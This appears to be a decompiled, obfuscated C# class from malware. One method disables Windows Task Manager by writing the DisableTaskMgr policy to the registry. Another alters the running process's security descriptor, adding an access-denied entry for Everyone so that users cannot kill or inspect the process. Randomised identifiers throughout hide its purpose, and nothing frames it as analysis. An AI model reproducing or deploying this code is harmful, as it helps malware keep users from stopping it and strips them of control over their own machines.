using System;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;

namespace ALzLGBAFaCqNDAE;

internal class hlCTylgyWeaD
{
	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr fhpBLsQAlQ, int yTMIpYKzWrgFepPpa, [Out] byte[] bhdIoocNaXkpsLm, uint aeciZyHybZmBTlI, out uint pCBcTUWfwJNT);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr JMqryAXYjQ, int xJIROShlliBBR, [In] byte[] SfUCAsxXtoeig);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void LcxbHqjHFUe(bool KtUIKdCixyJmlPsXA)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			if (KtUIKdCixyJmlPsXA && registryKey.GetValue("DisableTaskMgr") != null)
			{
				registryKey.DeleteValue("DisableTaskMgr");
			}
			else
			{
				registryKey.SetValue("DisableTaskMgr", "1");
			}
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor gXbIBFyeXw(IntPtr PsoxeKGpnMiRKf)
	{
		byte[] bhdIoocNaXkpsLm = new byte[0];
		GetKernelObjectSecurity(PsoxeKGpnMiRKf, 4, bhdIoocNaXkpsLm, 0u, out var pCBcTUWfwJNT);
		if ((long)pCBcTUWfwJNT > 32767L)
		{
			throw new Win32Exception();
		}
		if (!GetKernelObjectSecurity(PsoxeKGpnMiRKf, 4, bhdIoocNaXkpsLm = new byte[pCBcTUWfwJNT], pCBcTUWfwJNT, out pCBcTUWfwJNT))
		{
			throw new Win32Exception();
		}
		return new RawSecurityDescriptor(bhdIoocNaXkpsLm, 0);
	}

	private void qPeLXlrIWFDg(IntPtr zZrWRTXfKlC, RawSecurityDescriptor VjQGTEveSeX)
	{
		byte[] array = new byte[VjQGTEveSeX.BinaryLength];
		VjQGTEveSeX.GetBinaryForm(array, 0);
		if (!SetKernelObjectSecurity(zZrWRTXfKlC, 4, array))
		{
			throw new Win32Exception();
		}
	}

	public void UmXCqECkXcWekDJTZP()
	{
		IntPtr currentProcess = GetCurrentProcess();
		RawSecurityDescriptor rawSecurityDescriptor = gXbIBFyeXw(currentProcess);
		rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
		qPeLXlrIWFDg(currentProcess, rawSecurityDescriptor);
	}
}
